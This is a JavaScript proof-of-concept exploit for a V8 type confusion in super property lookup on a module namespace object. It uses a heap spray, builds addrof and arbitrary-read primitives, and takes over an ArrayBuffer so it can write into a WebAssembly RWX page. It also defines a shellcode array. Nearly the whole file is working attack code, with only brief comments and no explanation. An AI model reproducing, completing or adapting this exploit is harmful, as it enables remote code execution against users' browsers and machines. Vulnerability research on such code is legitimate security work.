import * as module from "1.mjs";

/*
=> 1.mjs
export let x = {};
export let y = {};
export let z = {};
*/

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function log(v) {
    let tmp = d2u(v);
    console.log(`hex value : 0x${tmp[1].toString(16)}-${tmp[0].toString(16)}`);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];

var victim_array = [];
victim_array.length = 0x1000;

var double_array = [1.1];
double_array.length = 0x10000;
for (let i = 0; i < double_array.length; i++) {
    double_array[i] = u2d(0x01332211, 0x88082480);
}

for (let i = 0; i < 0x10; i++)  {
    double_array[0xbe0 + i] = u2d(0x08248025, 0x08248101);
    double_array[0xbf0 + i] = u2d(0x08248125, 0x08248201);
    double_array[0xc00 + i] = u2d(0x41414141, 0x082481a0 - 7);
    double_array[0xc10 + i] = 0x11
}

function spray_heap() {
    for(var i = 0;i < victim_array.length;i++){
        victim_array[i] = double_array.slice(0,double_array.length);
    }
}

spray_heap();

function poc() {
    class C {
        m() {
            return super.y;
        }
    }

    let zz = {aa: 1, bb: 2};
    // receiver vs holder type confusion
    function trigger() {
        // set lookup_start_object
        C.prototype.__proto__ = zz;
        // set holder
        C.prototype.__proto__.__proto__ = module;

        // "c" is receiver in ComputeHandler [ic.cc]
        // "module" is holder
        // "zz" is lookup_start_object
        let c = new C();

        // 0x????????081d----
        c.x0 = 0x08248000 / 2;
        //c.x0 = 0x08608000 / 2;
        c.x1 = 0x42424242 / 2;
        c.x2 = 0x42424242 / 2;
        c.x3 = 0x42424242 / 2;
        c.x4 = 0x42424242 / 2;

        // LoadWithReceiverIC_Miss
        // => UpdateCaches (Monomorphic)
        // CheckObjectType with "receiver"
        let res = c.m();
        return res;
    }

    for (let i = 0; i < 0x100; i++) {
        trigger();
    }

    let evil = trigger();
    // create new HeapNumber object
    evil[0] = u2d(0x41414141, 0x41414141);

    let victim = [
        u2d(0x41414141, 0x42424242), u2d(0x43434343, 0x44444444),
        u2d(0x41414141, 0x42424242), u2d(0x43434343, 0x44444444),
        u2d(0x41414141, 0x42424242), u2d(0x43434343, 0x44444444),
        u2d(0x41414141, 0x42424242), u2d(0x43434343, 0x44444444),
    ].slice(0);

    let ab = new ArrayBuffer(0x1337);
    let leaked = [ab, ab, ab, ab];

    for (let i = 0; i < 0x10; i++) {
        // leak newly created HeapNumber object address to get relative offset to victim's elements
        let tmp = d2u(double_array[0xbf0 + i]);
        if (tmp[0] != 0x08248125) {
            // convert to Array
            double_array[0xbe1] = u2d(tmp[0] + 0x164 /* properties */, tmp[0] + 0x164 + 0x4c - 0x78 - 4 /* new elements */);
            double_array[0xbe0] = u2d(0x08248025, 0x08203ae1 /* new map */);
            break;
        }
    }

    function addrof(object) {
        leaked[0] = object;
        return evil[10];
    }

    for (let i = 0; i < 0x80; i++) {
        console.log(i);
        log(evil[i]);
    }

    function read(address) {
        evil[0] = u2d(address - 4 /* victim's elements */, 0x1000 /* victim's length */);
        return victim[0];
    }

    let wasm_address = addrof(wasm_instance);
    log(wasm_address);

    let rwx = read(d2u(wasm_address)[0] + 0x60 - 4);
    log(rwx);

    let ab_addr = addrof(ab);
    log(ab_addr);

    // set ArrayBuffer's backing_store to rwx page
    evil[0] = u2d(d2u(ab_addr)[0] + 0x1c - 8 /* victim's elements */, 0x1000 /* victim's length */);
    victim[0] = rwx;

    let dv = new DataView(ab);
    for (let i = 0; i < 0x100; i++)
        dv.setUint32(i * 4, 0xcccccccc, true);

    f();
}

poc();
